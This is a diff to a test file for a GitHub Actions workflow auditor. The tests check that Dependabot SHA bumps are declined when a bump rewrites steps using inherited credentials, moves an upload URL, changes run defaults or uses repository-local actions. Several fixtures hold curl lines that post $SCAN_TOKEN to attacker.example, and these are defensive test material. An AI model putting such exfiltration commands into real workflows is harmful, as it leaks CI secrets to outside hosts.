@@ -486,6 +486,238 @@ jobs:
       - uses: actions/create-github-app-token@df432f6cf7f0b4bd6dd8b7f9c0a4b1a0d33ba0d2
 `;
 
+// Workflow-scope env exposes a credential to every step in the job: each
+// step can read $SCAN_TOKEN from the runner process environment without
+// containing a credential expression of its own. The changed sources below
+// keep the credential entry byte-identical while (a) rewriting the step
+// body that consumes the inherited token and (b) changing only the sibling
+// UPLOAD_URL env value that decides where the token-bearing upload goes. A
+// surface that records only fields that themselves contain a credential
+// expression sees no change in either case.
+const REUSABLE_WORKFLOW_INHERITED_ENV_BASIS_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+env:
+  SCAN_TOKEN: \${{ secrets.SCAN_TOKEN_A }}
+  UPLOAD_URL: https://results.example
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps:
+      - run: osv-scan --upload "$UPLOAD_URL"
+`;
+
+const REUSABLE_WORKFLOW_INHERITED_ENV_STEP_BODY_CHANGED_SOURCE =
+  REUSABLE_WORKFLOW_INHERITED_ENV_BASIS_SOURCE.replace(
+    'osv-scan --upload "$UPLOAD_URL"',
+    'curl -X POST "$UPLOAD_URL" -d "token=$SCAN_TOKEN"',
+  );
+
+const REUSABLE_WORKFLOW_INHERITED_ENV_SIBLING_VALUE_CHANGED_SOURCE =
+  REUSABLE_WORKFLOW_INHERITED_ENV_BASIS_SOURCE.replace(
+    "https://results.example",
+    "https://attacker.example",
+  );
+
+// The workflow-level `name:` stays outside the recorded surface even under
+// the inherited-credential gate's full recording, so this pair proves the
+// gate still auto-approves a genuinely unchanged surface rather than
+// declining every workflow that carries a workflow-scope credential env.
+const REUSABLE_WORKFLOW_INHERITED_ENV_COSMETIC_SOURCE =
+  REUSABLE_WORKFLOW_INHERITED_ENV_BASIS_SOURCE.replace(
+    "name: osv-scanner",
+    "name: osv-scanner-cosmetically-renamed",
+  );
+
+// Job-scope env is exported to that job's steps the same way workflow-scope
+// env is; the changed source rewrites a step body that consumes the
+// inherited token while the env entry itself stays byte-identical.
+const REUSABLE_WORKFLOW_JOB_ENV_BASIS_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    env:
+      SCAN_TOKEN: \${{ secrets.SCAN_TOKEN_A }}
+    steps:
+      - run: osv-scan --offline
+`;
+
+const REUSABLE_WORKFLOW_JOB_ENV_STEP_BODY_CHANGED_SOURCE =
+  REUSABLE_WORKFLOW_JOB_ENV_BASIS_SOURCE.replace(
+    "osv-scan --offline",
+    'curl -X POST https://attacker.example -d "token=$SCAN_TOKEN"',
+  );
+
+// Both `uses:` shapes below are commit-relative: GitHub resolves a leading
+// `./` from the same commit as the file that contains it, so a SHA bump
+// changes what the byte-identical reference resolves to (the nested
+// workflow's runners/secrets, the local action's executable content)
+// without moving any field the surface diff compares on the caller.
+const REUSABLE_WORKFLOW_LOCAL_NESTED_WORKFLOW_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps: []
+  nested:
+    uses: ./.github/workflows/nested-scan.yml
+`;
+
+const REUSABLE_WORKFLOW_LOCAL_ACTION_STEP_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps:
+      - uses: ./.github/actions/scan-setup
+`;
+
+// GitHub applies workflow- and job-level `defaults.run` (shell,
+// working-directory) to every `run:` step, so a bump that edits only
+// `defaults` makes byte-identical credential-bearing step bodies execute
+// under a different interpreter or working directory. Neither field holds a
+// credential expression or routes anything itself, so a surface recording
+// only credential-bearing values and routing fields never sees the change.
+const REUSABLE_WORKFLOW_WORKFLOW_DEFAULTS_BASIS_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+defaults:
+  run:
+    shell: bash
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps:
+      - run: echo scan
+        env:
+          SCAN_TOKEN: \${{ secrets.SCAN_TOKEN_A }}
+`;
+
+const REUSABLE_WORKFLOW_WORKFLOW_DEFAULTS_CHANGED_SOURCE =
+  REUSABLE_WORKFLOW_WORKFLOW_DEFAULTS_BASIS_SOURCE.replace(
+    "    shell: bash",
+    "    shell: bash\n    working-directory: untrusted",
+  );
+
+const REUSABLE_WORKFLOW_JOB_DEFAULTS_BASIS_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    defaults:
+      run:
+        shell: bash
+    steps:
+      - run: echo scan
+        env:
+          SCAN_TOKEN: \${{ secrets.SCAN_TOKEN_A }}
+`;
+
+const REUSABLE_WORKFLOW_JOB_DEFAULTS_CHANGED_SOURCE =
+  REUSABLE_WORKFLOW_JOB_DEFAULTS_BASIS_SOURCE.replace(
+    "        shell: bash",
+    "        shell: bash\n        working-directory: untrusted",
+  );
+
+// Job-level defaults.run accepts expressions that can dereference `needs`,
+// so a byte-identical defaults declaration can resolve to a different
+// working directory when the producing job's output changes underneath it --
+// the same indirection the needs catch-all already declines for every other
+// routing-relevant field.
+const REUSABLE_WORKFLOW_DEFAULTS_NEEDS_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  pick:
+    runs-on: ubuntu-24.04
+    outputs:
+      dir: \${{ steps.pick.outputs.dir }}
+    steps:
+      - id: pick
+        run: echo "dir=safe" >> "$GITHUB_OUTPUT"
+  scan:
+    needs: pick
+    runs-on: ubuntu-24.04
+    defaults:
+      run:
+        working-directory: \${{ needs.pick.outputs.dir }}
+    steps: []
+`;
+
+const REUSABLE_WORKFLOW_DEFAULTS_NEEDS_COSMETIC_SOURCE =
+  REUSABLE_WORKFLOW_DEFAULTS_NEEDS_SOURCE.replace(
+    "    steps: []",
+    '    steps:\n      - run: echo "cosmetic step-body change, not security-relevant"',
+  );
+
 const REUSABLE_WORKFLOW_EMPTY_PERMISSIONS_SOURCE = `name: osv-scanner
 on:
   workflow_call:
@@ -3981,6 +4213,135 @@ test("Dependabot SHA bump that changes only the pinned ref of an existing creden
   );
 });
 
+// Regression test for a gap where the credential-reference surface recorded
+// a workflow-scope env entry only when that entry's own value contained a
+// credential expression, and recorded a step only when the step itself was
+// credential-bearing. A workflow-scope `env: SCAN_TOKEN: ${{ secrets.X }}`
+// is exported to every step's process environment, so a bumped SHA could
+// rewrite a step body that consumes $SCAN_TOKEN -- a body containing no
+// credential expression of its own -- while every recorded surface field
+// stayed byte-identical, and the new SHA inherited the reviewed contract.
+test("Dependabot SHA bump that rewrites a step consuming an inherited workflow-env credential is declined with a specific diagnostic", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_INHERITED_ENV_BASIS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_INHERITED_ENV_STEP_BODY_CHANGED_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(
+      `auto-approval declined: credentialReferences changed since the previously reviewed .*@${SHA}`,
+    ),
+  );
+});
+
+// Same gap, other direction: the credential env entry and every step stay
+// byte-identical while the sibling UPLOAD_URL env value that decides where
+// the token-bearing upload goes moves to an attacker host. The filtered
+// surface recorded only the env entries that themselves contained a
+// credential expression, so the sibling value was invisible to the diff.
+test("Dependabot SHA bump that changes only a sibling workflow-env value next to an inherited credential is declined with a specific diagnostic", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_INHERITED_ENV_BASIS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_INHERITED_ENV_SIBLING_VALUE_CHANGED_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(
+      `auto-approval declined: credentialReferences changed since the previously reviewed .*@${SHA}`,
+    ),
+  );
+});
+
+// Job-scope env reaches that job's steps exactly like workflow-scope env
+// reaches every job's steps; the inherited-credential gate must fire on
+// both scopes.
+test("Dependabot SHA bump that rewrites a step consuming an inherited job-env credential is declined with a specific diagnostic", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_JOB_ENV_BASIS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_JOB_ENV_STEP_BODY_CHANGED_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(
+      `auto-approval declined: credentialReferences changed since the previously reviewed .*@${SHA}`,
+    ),
+  );
+});
+
+// Positive control: the inherited-credential gate widens what is recorded,
+// not what is rejected -- a workflow that carries a workflow-scope
+// credential env but whose recorded surface is genuinely unchanged must
+// still auto-approve.
+test("Dependabot SHA bump with an unchanged inherited-credential-env surface is auto-approved", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_INHERITED_ENV_BASIS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_INHERITED_ENV_COSMETIC_SOURCE,
+    }),
+  });
+  assert.deepEqual(findings, []);
+});
+
 test("Dependabot SHA bump that changes a privileged execution boundary is declined", async () => {
   const nestedSha = "0123456789abcdef0123456789abcdef01234567";
   const candidates = [
@@ -4523,6 +4884,191 @@ test("Dependabot SHA bump is declined when the previously reviewed basis routes 
     new RegExp(
       `auto-approval declined: reviewed basis .*@${SHA} could not be fetched, parsed, or validated: job scan references needs in a routing-relevant field, which cannot be safely diffed for auto-approval`,
     ),
+  );
+});
+
+// Regression test for a gap where a called workflow's job-level
+// `uses: ./.github/workflows/<file>.yml` was recorded only as its literal
+// string. GitHub resolves the `./` prefix from the same commit as the
+// caller, so a SHA bump can leave the caller byte-identical while the
+// nested workflow changes runners or secrets underneath it -- the diff
+// never fetches the nested file, so both revisions compare as identical.
+// Both sources below are byte-identical on purpose: the decline must fire
+// on the reference shape itself, not on any observable diff.
+test("Dependabot SHA bump is declined when the called workflow delegates to a repository-local nested workflow", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_LOCAL_NESTED_WORKFLOW_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_LOCAL_NESTED_WORKFLOW_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    /auto-approval declined: job nested uses a repository-local action or reusable workflow, which resolves from the bumped commit and cannot be safely diffed for auto-approval/,
+  );
+});
+
+// A step-level `uses: ./path/to/action` is the same commit-relative shape
+// with a wider blast radius: the action is an arbitrary directory of
+// executable content that runs inside the job (and can read the job's
+// environment), and no single-file fetch can prove it unchanged across the
+// bump.
+test("Dependabot SHA bump is declined when a called job's step uses a repository-local action", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_LOCAL_ACTION_STEP_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_LOCAL_ACTION_STEP_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    /auto-approval declined: job scan uses a repository-local action or reusable workflow, which resolves from the bumped commit and cannot be safely diffed for auto-approval/,
+  );
+});
+
+test("Dependabot SHA bump is declined when the previously reviewed basis uses a repository-local reference", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_LOCAL_NESTED_WORKFLOW_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(
+      `auto-approval declined: reviewed basis .*@${SHA} could not be fetched, parsed, or validated: job nested uses a repository-local action or reusable workflow, which resolves from the bumped commit and cannot be safely diffed for auto-approval`,
+    ),
+  );
+});
+
+// Regression test for a gap where workflow-level `defaults` sat outside
+// every compared surface field. GitHub applies `defaults.run.shell` and
+// `defaults.run.working-directory` to every `run:` step, so a bump editing
+// only `defaults` executes a byte-identical credential-bearing step body
+// under a different interpreter or working directory while the whole
+// recorded surface stays unchanged.
+test("Dependabot SHA bump that changes workflow-level run defaults is declined with a specific diagnostic", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_WORKFLOW_DEFAULTS_BASIS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_WORKFLOW_DEFAULTS_CHANGED_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(`auto-approval declined: defaults changed since the previously reviewed .*@${SHA}`),
+  );
+});
+
+// Job-level defaults are the same execution-semantics surface scoped to one
+// job; they are compared as part of that job's execution boundary.
+test("Dependabot SHA bump that changes job-level run defaults is declined with a specific diagnostic", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_JOB_DEFAULTS_BASIS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_JOB_DEFAULTS_CHANGED_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(`auto-approval declined: routing changed since the previously reviewed .*@${SHA}`),
+  );
+});
+
+test("Dependabot SHA bump that resolves run defaults through a needs indirection is declined", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_DEFAULTS_NEEDS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_DEFAULTS_NEEDS_COSMETIC_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    /auto-approval declined: job scan references needs in a routing-relevant field, which cannot be safely diffed for auto-approval/,
   );
 });
 
